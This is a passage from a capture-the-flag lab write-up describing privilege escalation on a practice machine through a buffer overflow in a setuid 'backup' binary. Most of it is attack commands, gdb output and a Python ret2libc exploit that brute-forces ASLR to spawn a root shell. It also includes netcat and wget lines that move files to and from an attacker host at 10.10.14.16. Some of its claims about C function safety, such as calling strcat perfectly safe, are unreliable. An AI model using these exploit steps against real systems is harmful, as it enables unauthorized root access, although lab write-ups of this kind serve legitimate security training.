YkqiC7lmfCjMh9e05WEy1EBmPaFkYgxK2c6xWErsEv38++8xdqAcdEGXJBR2RT1TlxG/YlB4B7SwUem4xG6zJYi452F1klhkxloV6paNLWrcLwokdPJeCIrUbn+C9TesqoaaXASnictzNXUKzT905OFOcJwt7FbxyXk0z3FxD/tgtUHcFBLAQI/AzMDAQBjAG++IksAAAAA7QMAABgKAAAIAAsAAAAAAAAAIIC0gQAAAAByb290LnR4dAGZBwACAEFFAQgAUEsFBgAAAAABAAEAQQAAAB4EAAAAAA== | base64 -d > /tmp/data

file !$
unzip !$
#    --> skipping: root.txt                need PK compat. v5.1 (can do v4.6)

./usr/local/bin/backup a a01a6aa5aaf1d7729f35c8278daae30f8a988257144c003f8b12c5aec39bc508 /root/root.txt

echo UEsDBDMDAQBjAG++IksAAAAA7QMAABgKAAAIAAsAcm9vdC50eHQBmQcAAgBBRQEIAEbBKBl0rFrayqfbwJ2YyHunnYq1Za6G7XLo8C3RH/hu0fArpSvYauq4AUycRmLuWvPyJk3sF+HmNMciNHfFNLD3LdkGmgwSW8j50xlO6SWiH5qU1Edz340bxpSlvaKvE4hnK/oan4wWPabhw/2rwaaJSXucU+pLgZorY67Q/Y6cfA2hLWJabgeobKjMy0njgC9c8cQDaVrfE/ZiS1S+rPgz/e2Pc3lgkQ+lAVBqjo4zmpQltgIXauCdhvlA1Pe/BXhPQBJab7NVF6Xm3207EfD3utbrcuUuQyF+rQhDCKsAEhqQ+Yyp1Tq2o6BvWJlhtWdts7rCubeoZPDBD6Mejp3XYkbSYYbzmgr1poNqnzT5XPiXnPwVqH1fG8OSO56xAvxx2mU2EP+Yhgo4OAghyW1sgV8FxenV8p5c+u9bTBTz/7WlQDI0HUsFAOHnWBTYR4HTvyi8OPZXKmwsPAG1hrlcrNDqPrpsmxxmVR8xSRbBDLSrH14pXYKPY/a4AZKO/GtVMULlrpbpIFqZ98zwmROFstmPl/cITNYWBlLtJ5AmsyCxBybfLxHdJKHMsK6Rp4MO+wXrd/EZNxM8lnW6XNOVgnFHMBsxJkqsYIWlO0MMyU9L1CL2RRwm2QvbdD8PLWA/jp1fuYUdWxvQWt7NjmXo7crC1dA0BDPg5pVNxTrOc6lADp7xvGK/kP4F0eR+53a4dSL0b6xFnbL7WwRpcF+Ate/Ut22WlFrg9A8gqBC8Ub1SnBU2b93ElbG9SFzno5TFmzXk3onbLaaEVZl9AKPA3sGEXZvVP+jueADQsokjJQwnzg1BRGFmqWbR6hxPagTVXBbQ+hytQdd26PCuhmRUyNjEIBFx/XqkSOfAhLI9+Oe4FH3hYqb1W6xfZcLhpBs4Vwh7t2WGrEnUm2/F+X/OD+s9xeYniyUrBTEaOWKEv2NOUZudU6X2VOTX6QbHJryLdSU9XLHB+nEGeq+sdtifdUGeFLct+Ee2pgR/AsSexKmzW09cx865KuxKnR3yoC6roUBb30Ijm5vQuzg/RM71P5ldpCK70RemYniiNeluBfHwQLOxkDn/8MN0CEBr1eFzkCNdblNBVA7b9m7GjoEhQXOpOpSGrXwbiHHm5C7Zn4kZtEy729ZOo71OVuT9i+4vCiWQLHrdxYkqiC7lmfCjMh9e05WEy1EBmPaFkYgxK2c6xWErsEv38++8xdqAcdEGXJBR2RT1TlxG/YlB4B7SwUem4xG6zJYi452F1klhkxloV6paNLWrcLwokdPJeCIrUbn+C9TesqoaaXASnictzNXUKzT905OFOcJwt7FbxyXk0z3FxD/tgtUHcFBLAQI/AzMDAQBjAG++IksAAAAA7QMAABgKAAAIAAsAAAAAAAAAIIC0gQAAAAByb290LnR4dAGZBwACAEFFAQgAUEsFBgAAAAABAAEAQQAAAB4EAAAAAA== | base64 -d > data

7z l data
7z x data                                                         # Password ?
fcrackzip -b -D -u -p /usr/share/wordlists/rockyou.txt data       # :(

./usr/local/bin/backup a a01a6aa5aaf1d7729f35c8278daae30f8a988257144c003f8b12c5aec39bc508 /roo?

echo UEsDBDMDAQBjAG++IksAAAAA7QMAABgKAAAIAAsAcm9vdC50eHQBmQcAAgBBRQEIAEbBKBl0rFrayqfbwJ2YyHunnYq1Za6G7XLo8C3RH/hu0fArpSvYauq4AUycRmLuWvPyJk3sF+HmNMciNHfFNLD3LdkGmgwSW8j50xlO6SWiH5qU1Edz340bxpSlvaKvE4hnK/oan4wWPabhw/2rwaaJSXucU+pLgZorY67Q/Y6cfA2hLWJabgeobKjMy0njgC9c8cQDaVrfE/ZiS1S+rPgz/e2Pc3lgkQ+lAVBqjo4zmpQltgIXauCdhvlA1Pe/BXhPQBJab7NVF6Xm3207EfD3utbrcuUuQyF+rQhDCKsAEhqQ+Yyp1Tq2o6BvWJlhtWdts7rCubeoZPDBD6Mejp3XYkbSYYbzmgr1poNqnzT5XPiXnPwVqH1fG8OSO56xAvxx2mU2EP+Yhgo4OAghyW1sgV8FxenV8p5c+u9bTBTz/7WlQDI0HUsFAOHnWBTYR4HTvyi8OPZXKmwsPAG1hrlcrNDqPrpsmxxmVR8xSRbBDLSrH14pXYKPY/a4AZKO/GtVMULlrpbpIFqZ98zwmROFstmPl/cITNYWBlLtJ5AmsyCxBybfLxHdJKHMsK6Rp4MO+wXrd/EZNxM8lnW6XNOVgnFHMBsxJkqsYIWlO0MMyU9L1CL2RRwm2QvbdD8PLWA/jp1fuYUdWxvQWt7NjmXo7crC1dA0BDPg5pVNxTrOc6lADp7xvGK/kP4F0eR+53a4dSL0b6xFnbL7WwRpcF+Ate/Ut22WlFrg9A8gqBC8Ub1SnBU2b93ElbG9SFzno5TFmzXk3onbLaaEVZl9AKPA3sGEXZvVP+jueADQsokjJQwnzg1BRGFmqWbR6hxPagTVXBbQ+hytQdd26PCuhmRUyNjEIBFx/XqkSOfAhLI9+Oe4FH3hYqb1W6xfZcLhpBs4Vwh7t2WGrEnUm2/F+X/OD+s9xeYniyUrBTEaOWKEv2NOUZudU6X2VOTX6QbHJryLdSU9XLHB+nEGeq+sdtifdUGeFLct+Ee2pgR/AsSexKmzW09cx865KuxKnR3yoC6roUBb30Ijm5vQuzg/RM71P5ldpCK70RemYniiNeluBfHwQLOxkDn/8MN0CEBr1eFzkCNdblNBVA7b9m7GjoEhQXOpOpSGrXwbiHHm5C7Zn4kZtEy729ZOo71OVuT9i+4vCiWQLHrdxYkqiC7lmfCjMh9e05WEy1EBmPaFkYgxK2c6xWErsEv38++8xdqAcdEGXJBR2RT1TlxG/YlB4B7SwUem4xG6zJYi452F1klhkxloV6paNLWrcLwokdPJeCIrUbn+C9TesqoaaXASnictzNXUKzT905OFOcJwt7FbxyXk0z3FxD/tgtUHcFBLAQI/AzMDAQBjAG++IksAAAAA7QMAABgKAAAIAAsAAAAAAAAAIIC0gQAAAAByb290LnR4dAGZBwACAEFFAQgAUEsFBgAAAAABAAEAQQAAAB4EAAAAAA== | base64 -d > data.zip

unzip data.zip
#      --> skipping: root.txt      :(
```

<br />
<img src="{{ site.img_path }}/node_writeup/Node_068.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/node_writeup/Node_069.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/node_writeup/Node_070.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/node_writeup/Node_071.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/node_writeup/Node_072.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/node_writeup/Node_073.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br/>
<img src="{{ site.img_path }}/node_writeup/Node_074.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/node_writeup/Node_075.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/node_writeup/Node_076.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/node_writeup/Node_077.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/node_writeup/Node_078.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br /><br />

It seems to me that trying to leak sensitive files from the system is not the way to go, so I reverse engineer the binary and check what functions it uses and maybe some of them are susceptible to **Buffer Overflow**. I investigate for a while and I find that the **`strcpy`** function is vulnerable, and if I pass in the third argument a long enough string I succeed in overflowing the stack and crashing the binary. I am going to transfer it to my machine to do debbugging with `gdb` to use this vulnerability and try to escalate privileges.

- **fgets**, **fgetsn**: It is safe to use because it checks the array bound. It keeps on reading until a new line character is encountered or the maximum limit of the character array.

- **fopen**, **fdopen()** and **freopen()** are thread-safe.

- **getpid**, **getpgrp**, and **getppid** functions are always successful and no return value is reserved to indicate an error.

- **printf**: is thread-safe but not async-signal-safe. here is a list of functions which are async-signal-safe according to the standard.

- **sprintf**: The primary security risk associated with using sprintf() is that of a buffer overflow attack, While being a relatively common issue, these issues are not trivial and could be leveraged to cause some serious damage.

- **strcat**, **strncpy**: are perfectly safe functions. Also note that strncpy was never intended to be a safe version of strcpy. It is used for an obscure, obsolete string format used in an ancient version of Unix.

> **`strcpy` vulnerable to Buffer Overflow!!**

> **Victime Machine:**

```bash
ltrace ./usr/local/bin/backup a a01a6aa5aaf1d7729f35c8278daae30f8a988257144c003f8b12c5aec39bc508 /tmp
#    --> functions:
#    fgets,fgetsn,fopen,getpid,printf,sprintf,strcat,strchr,strcmp,strcpy,strcspn,strncpy,strstr,system

ltrace ./usr/local/bin/backup a a01a6aa5aaf1d7729f35c8278daae30f8a988257144c003f8b12c5aec39bc508 /tmp
#    --> strcpy(0xffe5c34c, "/tmp")        Vulnerable Function!!

./usr/local/bin/backup a a01a6aa5aaf1d7729f35c8278daae30f8a988257144c003f8b12c5aec39bc508 $(python2 -c 'print "A"*100')
./usr/local/bin/backup a a01a6aa5aaf1d7729f35c8278daae30f8a988257144c003f8b12c5aec39bc508 $(python2 -c 'print "A"*200')
./usr/local/bin/backup a a01a6aa5aaf1d7729f35c8278daae30f8a988257144c003f8b12c5aec39bc508 $(python2 -c 'print "A"*500')
./usr/local/bin/backup a a01a6aa5aaf1d7729f35c8278daae30f8a988257144c003f8b12c5aec39bc508 $(python2 -c 'print "A"*1000')
#      --> Segmentation fault (core dumped)!!!       Buffer Overflow

which backup
which backup | xargs file
#    --> ELF 32-bit LSB executable, Intel 80386
```

> **Attacker Machine:**

```bash
nc -nlvp 443 > backup
```

> **Victime Machine:**

```bash
nc 10.10.14.16 443 < /usr/local/bin/backup
md5sum /usr/local/bin/backup
```

> **Attacker Machine:**

```bash
md5sum backup
```

<br />
<img src="{{ site.img_path }}/node_writeup/Node_079.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/node_writeup/Node_080.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/node_writeup/Node_081.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/node_writeup/Node_082.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/node_writeup/Node_083.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br /><br />

Before debugging the binary, I check if the **[Randomization of Virtual Address Space](https://linux-audit.com/linux-aslr-and-kernelrandomize_va_space-setting/){:target="_blank"}** protection is enabled, and indeed it is, also if with `gdb` I see the **[protection properties](https://opensource.com/article/21/6/linux-checksec){:target="_blank"}** enabled in the binary, only **NX** is, so I will not be able to execute malicious shellcode directly on the stack. What I have left is to perform a **ret2libc** attack. To bypass the randomization protection, I just have to produce a libc base address **collision** - that is, run my exploit a significant number of times with a static address, because at some point the binary is going to use it. The collision is possible due to the 32-bit architecture of the system.

> **NX** stands for "non-executable." It's often enabled at the CPU level, so an operating system with **NX** enabled can mark certain areas of memory as non-executable. Often, buffer-overflow exploits put code on the stack and then try to execute it. However, making this writable area non-executable can prevent such attacks (Then --> Use ret2libc attack!).


> **Default randomize_va_space setting**: Modern Linux kernels have **ASLR** enabled by default with the specific value **2**. Normally you might expect a value of **0** (**disabled**), or **1** (**enabled**). In the case of the randomize_va_space setting, this is true as well. When setting the value to 1, address space is randomized. This includes the positions of the stack itself, virtual dynamic shared object (VDSO) page, and shared memory regions. Setting the option to value 2 will be similar to 1, and add data segments as well. For most systems, this setting is the default and the most secure setting.

> **Attacker Machine:**

```bash
chmod +x backup
gdb ./backup
    /> checksec

#        CANARY    : disabled
#        FORTIFY   : disabled
#        NX        : ENABLED
#        PIE       : disabled
#        RELRO     : Partial

#        --> NX: ✓       DEP
```

> **Victime Machine:**

```bash
cat /proc/sys/kernel/randomize_va_space         # --> 2
#    --> ASLR Active!!

# Find base libc address
which backup
which backup | xargs ldd | grep libc            # Execute a few times --> base libc address dinamyc!

which backup | xargs ldd | grep libc | awk 'NF{print $NF}'
which backup | xargs ldd | grep libc | awk 'NF{print $NF}' | tr -d '()'

for i in $(seq 1 500); do which backup | xargs ldd | grep libc | awk 'NF{print $NF}' | tr -d '()'; done
for i in $(seq 1 500); do which backup | xargs ldd | grep libc | awk 'NF{print $NF}' | tr -d '()' | grep "0xf75fc000"; done

for i in $(seq 1 500); do which backup | xargs ldd | grep libc | awk 'NF{print $NF}' | tr -d '()' | grep "0xf75fc000" -n; done
#       1 :(

for i in $(seq 1 500); do which backup | xargs ldd | grep libc | awk 'NF{print $NF}' | tr -d '()'; done | grep "0xf75fc000" -n
#        :):)
```

<br />
<img src="{{ site.img_path }}/node_writeup/Node_084.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/node_writeup/Node_085.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/node_writeup/Node_086.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br /><br />

I try on my attacking machine to perform a **buffer overflow** and crash the `backup` binary, but I am not able to do it because I get an error, the program is looking for a file. If I use `ltrace` to find out what is happening, I notice that it searches for the file with the keys before reading the third argument, so it does not crash the binary. If I create the directory with the file I can now run the binary and enter a 1000 character string and crash the binary.

```bash
./backup a a01a6aa5aaf1d7729f35c8278daae30f8a988257144c003f8b12c5aec39bc508 $(python2 -c 'print "A"*1000')
#      --> [!] Could not open file     ??

ltrace ./backup a a01a6aa5aaf1d7729f35c8278daae30f8a988257144c003f8b12c5aec39bc508 $(python2 -c 'print "A"*1000')
#      --> /etc/myplace/keys       Not found!!

cd /etc
mkdir ./myplace/
cd !$
echo '' > /etc/myplace/keys
cat keys
./backup a a01a6aa5aaf1d7729f35c8278daae30f8a988257144c003f8b12c5aec39bc508 $(python2 -c 'print "A"*1000')
#    --> zsh: segmentation fault  ./backup a "" $(python2 -c 'print "A"*1000')       :)
```

<br />
<img src="{{ site.img_path }}/node_writeup/Node_087.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/node_writeup/Node_088.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/node_writeup/Node_089.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/node_writeup/Node_090.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/node_writeup/Node_091.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/node_writeup/Node_092.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br /><br />

Now I try to crash the binary using `gdb`, so I can visualize if the registers I want to control are taking the values I need. Now I have to find the correct **offset** to take control of **EIP**, so I generate a random string to enter as third argument but it is generating an error, I think due to some special characters. I will use a **Metasploit** script, **`pattern_create.rb`**, to generate the string and then calculate the value of the **offset**.

```bash
gdb ./backup
    > r a "" $(python3 -c 'print ("A"*1000)')             # :)
#        --> EIP: 0x41414141 ('AAAA')
    > pattern create 1000
    > r a "" AAA%AAsAABAA$AAnAACAA-AA(AADAA;AA)AAEAAaAA0AAFAAbAA1AAGAAcAA2AAHAAdAA3AAIAAeAA4AAJAAfAA5AAKAAgAA6AALAAhAA7
AAMAAiAA8AANAAjAA9AAOAAkAAPAAlAAQAAmAARAAoAASAApAATAAqAAUAArAAVAAtAAWAAuAAXAAvAAYAAwAAZAAxAAyAAzA%%A%sA%BA%$A%nA%CA%-A%
(A%DA%;A%)A%EA%aA%0A%FA%bA%1A%GA%cA%2A%HA%dA%3A%IA%eA%4A%JA%fA%5A%KA%gA%6A%LA%hA%7A%MA%iA%8A%NA%jA%9A%OA%kA%PA%lA%QA%mA
%RA%oA%SA%pA%TA%qA%UA%rA%VA%tA%WA%uA%XA%vA%YA%wA%ZA%xA%yA%zAs%AssAsBAs$AsnAsCAs-As(AsDAs;As)AsEAsaAs0AsFAsbAs1AsGAscAs2
AsHAsdAs3AsIAseAs4AsJAsfAs5AsKAsgAs6AsLAshAs7AsMAsiAs8AsNAsjAs9AsOAskAsPAslAsQAsmAsRAsoAsSAspAsTAsqAsUAsrAsVAstAsWAsuAs
XAsvAsYAswAsZAsxAsyAszAB%ABsABBAB$ABnABCAB-AB(ABDAB;AB)ABEABaAB0ABFABbAB1ABGABcAB2ABHABdAB3ABIABeAB4ABJABfAB5ABKABgAB6A
BLABhAB7ABMABiAB8ABNABjAB9ABOABkABPABlABQABmABRABoABSABpABTABqABUABrABVABtABWABuABXABvABYABwABZABxAByABzA$%A$sA$BA$$A$n
A$CA$-A$(A$DA$;A$)A$EA$aA$0A$FA$bA$1A$GA$cA$2A$HA$dA$3A$IA$eA$4A$JA$fA$5A$KA$gA$6A$LA$hA$7A$MA$iA$8A$NA$jA$9A$OA$kA$PA$
lA$QA$mA$RA$oA$SA$pA$TA$qA$UA$rA$VA$tA$WA$uA$XA$vA$YA$wA$ZA$x
#             :(

    > r a "" 'AAA%AAsAABAA$AAnAACAA-AA(AADAA;AA)AAEAAaAA0AAFAAbAA1AAGAAcAA2AAHAAdAA3AAIAAeAA4AAJAAfAA5AAKAAgAA6AALAAhAA
7AAMAAiAA8AANAAjAA9AAOAAkAAPAAlAAQAAmAARAAoAASAApAATAAqAAUAArAAVAAtAAWAAuAAXAAvAAYAAwAAZAAxAAyAAzA%%A%sA%BA%$A%nA%CA%-A
%(A%DA%;A%)A%EA%aA%0A%FA%bA%1A%GA%cA%2A%HA%dA%3A%IA%eA%4A%JA%fA%5A%KA%gA%6A%LA%hA%7A%MA%iA%8A%NA%jA%9A%OA%kA%PA%lA%QA%m
A%RA%oA%SA%pA%TA%qA%UA%rA%VA%tA%WA%uA%XA%vA%YA%wA%ZA%xA%yA%zAs%AssAsBAs$AsnAsCAs-As(AsDAs;As)AsEAsaAs0AsFAsbAs1AsGAscAs
2AsHAsdAs3AsIAseAs4AsJAsfAs5AsKAsgAs6AsLAshAs7AsMAsiAs8AsNAsjAs9AsOAskAsPAslAsQAsmAsRAsoAsSAspAsTAsqAsUAsrAsVAstAsWAsuA
sXAsvAsYAswAsZAsxAsyAszAB%ABsABBAB$ABnABCAB-AB(ABDAB;AB)ABEABaAB0ABFABbAB1ABGABcAB2ABHABdAB3ABIABeAB4ABJABfAB5ABKABgAB6
ABLABhAB7ABMABiAB8ABNABjAB9ABOABkABPABlABQABmABRABoABSABpABTABqABUABrABVABtABWABuABXABvABYABwABZABxAByABzA$%A$sA$BA$$A$
nA$CA$-A$(A$DA$;A$)A$EA$aA$0A$FA$bA$1A$GA$cA$2A$HA$dA$3A$IA$eA$4A$JA$fA$5A$KA$gA$6A$LA$hA$7A$MA$iA$8A$NA$jA$9A$OA$kA$PA
$lA$QA$mA$RA$oA$SA$pA$TA$qA$UA$rA$VA$tA$WA$uA$XA$vA$YA$wA$ZA$x'
#             :(

/usr/share/metasploit-framework/tools/exploit/pattern_create.rb --help
/usr/share/metasploit-framework/tools/exploit/pattern_create.rb -l 1000 -s ABCDEFGHIJKLMNOPQRSTUVWXYZ,abcdefghijklmnopqrstuvwxyz,0123456789

gdb ./backup
    > r a "" Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4A
d5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4
Ah5Ah6Ah7Ah8Ah9Ai0Ai1Ai2Ai3Ai4Ai5Ai6Ai7Ai8Ai9Aj0Aj1Aj2Aj3Aj4Aj5Aj6Aj7Aj8Aj9Ak0Ak1Ak2Ak3Ak4Ak5Ak6Ak7Ak8Ak9Al0Al1Al2Al3Al
4Al5Al6Al7Al8Al9Am0Am1Am2Am3Am4Am5Am6Am7Am8Am9An0An1An2An3An4An5An6An7An8An9Ao0Ao1Ao2Ao3Ao4Ao5Ao6Ao7Ao8Ao9Ap0Ap1Ap2Ap3A
p4Ap5Ap6Ap7Ap8Ap9Aq0Aq1Aq2Aq3Aq4Aq5Aq6Aq7Aq8Aq9Ar0Ar1Ar2Ar3Ar4Ar5Ar6Ar7Ar8Ar9As0As1As2As3As4As5As6As7As8As9At0At1At2At3
At4At5At6At7At8At9Au0Au1Au2Au3Au4Au5Au6Au7Au8Au9Av0Av1Av2Av3Av4Av5Av6Av7Av8Av9Aw0Aw1Aw2Aw3Aw4Aw5Aw6Aw7Aw8Aw9Ax0Ax1Ax2Ax
3Ax4Ax5Ax6Ax7Ax8Ax9Ay0Ay1Ay2Ay3Ay4Ay5Ay6Ay7Ay8Ay9Az0Az1Az2Az3Az4Az5Az6Az7Az8Az9Ba0Ba1Ba2Ba3Ba4Ba5Ba6Ba7Ba8Ba9Bb0Bb1Bb2B
b3Bb4Bb5Bb6Bb7Bb8Bb9Bc0Bc1Bc2Bc3Bc4Bc5Bc6Bc7Bc8Bc9Bd0Bd1Bd2Bd3Bd4Bd5Bd6Bd7Bd8Bd9Be0Be1Be2Be3Be4Be5Be6Be7Be8Be9Bf0Bf1Bf2
Bf3Bf4Bf5Bf6Bf7Bf8Bf9Bg0Bg1Bg2Bg3Bg4Bg5Bg6Bg7Bg8Bg9Bh0Bh1Bh2B
#    --> EIP: 0x31724130 ('0Ar1')
```

<br />
<img src="{{ site.img_path }}/node_writeup/Node_093.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/node_writeup/Node_094.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/node_writeup/Node_095.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/node_writeup/Node_096.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/node_writeup/Node_097.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/node_writeup/Node_098.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br /><br />

Now I can take the string that was saved in **EIP** after overflowing the buffer and with the **Metasploit** script, **`pattern_offset.rb`**, get the **offset**. Then I can create a string with the exact amount of **A's** to complete the buffer and take control of **EIP** with the value that I need, I check it to see that it has the 4 **B's** that I send in the string. I am also going to create the exploit that I will need to exploit the **Buffer Overflow** in the victim machine (I am going to test it in my attacker machine), first to take control of **EIP**.

> **[struct](https://docs.python.org/3/library/struct.html){:target="_blank"}**: This module converts between Python values and C structs represented as Python bytes objects.

> **struct.pack(format, v1, v2, ...)** --> Return a bytes object containing the values v1, v2, … packed according to the format string format. The arguments must match the values required by the format exactly.

> **[sys](https://docs.python.org/3/library/sys.html){:target="_blank"}**: This module provides access to some variables used or maintained by the interpreter and to functions that interact strongly with the interpreter. It is always available.
> **sys.stdout**: stdout is used for the output of print() and expression statements and for the prompts of input().

> **sys.stdout.buffer.write()**: To write or read binary data from/to the standard streams, use the underlying binary buffer object.

```bash
/usr/share/metasploit-framework/tools/exploit/pattern_offset.rb --help
/usr/share/metasploit-framework/tools/exploit/pattern_offset.rb -l 1000 -s ABCDEFGHIJKLMNOPQRSTUVWXYZ,abcdefghijklmnopqrstuvwxyz,0123456789 -q 0Ar1
#      512 Offset!

gdb ./backup
    > r a "" $(python2 -c 'print "A"*512 + "B"*4')

nvim bof_exploit.py
cat !$
gdb ./backup
    /> r a "" $(python3 bof_exploit.py)
```

> **bof_exploit.py**

```python
#!/usr/bin/python3

from struct import pack
import signal, sys
from pdb import *

def def_handler(sig, frame):
    print("\n\n[!] Bye Bye ..\n")
    sys.exit(1)

# Ctrl c
signal.signal(signal.SIGINT, def_handler)

if __name__ == "__main__":

    offset = 512
    before_eip = b"A" * offset
    eip = b"B" * 4

    payload = before_eip + eip

    sys.stdout.buffer.write(payload)
```

<br />
<img src="{{ site.img_path }}/node_writeup/Node_099.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/node_writeup/Node_100.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/node_writeup/Node_101.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/node_writeup/Node_102.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/node_writeup/Node_103.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/node_writeup/Node_104.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br /><br />

If I try to perform the **Buffer overflow** on the `backup` binary, but first on my attacking machine, I must calculate the base address of **libc** and the offsets of **system()**, **exit()** and **"/bin/sh"** in libc (to then calculate the addresses). I adjust my exploit and try to perform the attack locally, there is a permissions issue, but in order not to risk breaking something in my machine, I will try directly on the victim machine.

```bash
ldd backup
#         libc.so.6 => /lib32/libc.so.6 (0xf7c00000)
readelf -s /lib32/libc.so.6 | grep -E " system@| exit@"
#       1567: 0003bd00    33 FUNC    GLOBAL DEFAULT   15 exit@@GLIBC_2.0
#       3172: 0004c8c0    55 FUNC    WEAK   DEFAULT   15 system@@GLIBC_2.0
strings -a -t x /lib32/libc.so.6 | grep "/bin/sh"
#        1b5faa /bin/sh

#Then --> ret2libc: EIP -> SYSTEM + EXIT + BIN_SH
nvim bof_exploit.py
./backup a "" $(python3 bof_exploit.py)                 # :( ??
```

> **bof_exploit.py**

```python
#!/usr/bin/python3

from struct import pack
import signal, sys
from pdb import *

def def_handler(sig, frame):
    print("\n\n[!] Bye Bye ..\n")
    sys.exit(1)

# Ctrl c
signal.signal(signal.SIGINT, def_handler)

if __name__ == "__main__":

    offset = 512
    before_eip = b"A" * offset

    # ldd backup
    #   libc.so.6 => /lib32/libc.so.6 (0xf7c00000)
    base_libc_address = 0xf7c00000

    # readelf -s /lib32/libc.so.6 | grep -E " system@| exit@"
    # 1567: 0003bd00    33 FUNC    GLOBAL DEFAULT   15 exit@@GLIBC_2.0
    # 3172: 0004c8c0    55 FUNC    WEAK   DEFAULT   15 system@@GLIBC_2.0
    # strings -a -t x /lib32/libc.so.6 | grep "/bin/sh"
    # 1b5faa /bin/sh
    system_offset = 0x0004c8c0
    exit_offset = 0x0003bd00
    bin_sh_offset = 0x001b5faa

    system_address = pack("<I", base_libc_address + system_offset)
    exit_address = pack("<I", base_libc_address + exit_offset)
    bin_sh_address = pack("<I", base_libc_address + bin_sh_offset)

    # ret2libc: EIP -> SYSTEM + EXIT + BIN_SH
    eip = system_address + exit_address + bin_sh_address

    payload = before_eip + eip

    sys.stdout.buffer.write(payload)
```

<br />
<img src="{{ site.img_path }}/node_writeup/Node_105.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/node_writeup/Node_106.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/node_writeup/Node_107.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/node_writeup/Node_108.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br /><br />

I will search for all the data I need on the victim machine in order to exploit the **Buffer Overflow** - **libc** base address and the **system**, **exit**, **"/bin/sh"** offsets in libc. It only remains for me to modify the exploit and transfer it to the host. I am going to run the `backup` binary and in the third parameter the exploit will be executed, which is going to generate the string with the **payload**. I just have to run it a high number of times to perform the collision and thus obtain a shell as the `root` user. After waiting a while and if necessary, a couple of times, I succeed to exploiting the **Buffer Overflow** and escalate privileges, and I can access the last flag.

> **Victime Machine:**

```bash
which backup | xargs ldd
readelf -s /lib32/libc.so.6
readelf -s /lib32/libc.so.6 | grep -E " exit@| system@"
#  --> 0002e7b0 exit@@GLIBC_2.0
#  --> 0003a940 system@@GLIBC_2.0
#        Offset!

strings -a -t x /lib32/libc.so.6 | grep "/bin/sh"
#  --> 15900b /bin/sh
```

> **Attacker Machine:**

```bash
nvim bof_exploit.py
python3 -m http.server 80
```

> **Victime Machine:**

```bash
wget http://10.10.14.16/bof_exploit.py

for i in $(seq 1 1000); do /usr/local/bin/backup a "" $(python3 bof_exploit.py); done
#      :):):):)
```

> **bof_exploit.py**

```python
#!/usr/bin/python3

from struct import pack
import signal, sys
from pdb import *

def def_handler(sig, frame):
    print("\n\n[!] Bye Bye ..\n")
    sys.exit(1)

# Ctrl c
